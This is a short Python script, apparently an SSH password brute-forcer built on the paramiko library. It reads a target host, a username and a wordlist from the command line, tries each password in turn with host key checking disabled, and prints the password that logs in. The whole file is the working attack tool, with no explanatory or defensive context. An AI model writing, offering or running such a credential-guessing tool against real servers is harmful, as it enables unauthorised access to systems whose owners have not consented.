import paramiko
import sys

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

for p in open(sys.argv[3]):
    try:
        ssh.connect(sys.argv[1], username=sys.argv[2], password=p.strip(), timeout=1)
        print(f'FOUND: {p}')
        break
    except:
        pass
